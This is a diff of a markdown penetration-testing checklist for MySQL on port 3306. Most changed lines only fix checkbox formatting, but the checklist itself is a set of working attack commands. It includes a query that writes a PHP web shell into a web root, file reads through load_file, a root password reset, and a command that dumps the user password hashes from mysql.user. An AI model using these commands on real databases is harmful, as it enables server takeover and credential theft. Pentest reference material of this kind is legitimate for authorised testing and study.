@@ -230,16 +230,16 @@ MySQL [Port 3306]
          2122 <IP>
     
     
-- [ ]Banner Grabbing
+- [ ] Banner Grabbing
 - [ ] Basic Commands
-  - [ ]Enumerating Privileges
-    - [ ] select grantee, table_schema, privilege_type FROM schema_privileges;
+- [ ] Enumerating Privileges
+- [ ] select grantee, table_schema, privilege_type FROM schema_privileges;
 
 - [ ] Enumerating File Privileges
-     - [ ]select user,file_priv from mysql.user where user='root';
+- [ ] select user,file_priv from mysql.user where user='root';
 
 - [ ] Enumerating Current User
-   - [ ]select user();
+- [ ] select user();
     
 - [ ] Writing File
 - [ ] select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE 'C:/xampp/htdocs/shell.php';
@@ -247,12 +247,12 @@ MySQL [Port 3306]
 - [ ] Reading file
 - [ ] select load_file('/home/purabparihar/read_file.txt');
     
-- [ ]User password change
+- [ ] User password change
   - [ ] UPDATE mysql.user SET authentication_string=PASSWORD('MyNewPass') WHERE User='root';
   - [ ] UPDATE mysql.user SET Password=PASSWORD('MyNewPass') WHERE User='root'
     
-- [ ]Extracting credentials
-   - [ ] mysql -u root --password=<PASSWORD> -e "SELECT User,Host,authentication_string FROM mysql.user;"    
+- [ ] Extracting credentials
+  - [ ] mysql -u root --password=<PASSWORD> -e "SELECT User,Host,authentication_string FROM mysql.user;"    
     
     
 Postgresql [Port 5432]
